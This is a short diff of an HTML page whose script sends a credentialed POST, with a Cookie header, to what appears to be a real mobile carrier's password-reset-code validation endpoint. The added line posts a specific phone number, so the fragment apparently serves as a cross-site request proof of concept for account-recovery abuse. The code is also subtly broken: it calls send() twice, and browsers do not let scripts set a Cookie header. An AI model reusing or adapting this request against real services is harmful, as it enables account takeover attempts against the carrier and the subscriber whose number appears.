@@ -18,6 +18,7 @@
         xhttp.open("POST", "https://w3b-api.ultramobile.com/v1/mint/account/password/reset-code/validate", true);
         xhttp.withCredentials = true;
         xhttp.setRequestHeader("Cookie", cookieValue);
+        xhttp.send(JSON.stringify({ "msisdn": "3348194091" }));
         xhttp.send();
     </script>
 </body>
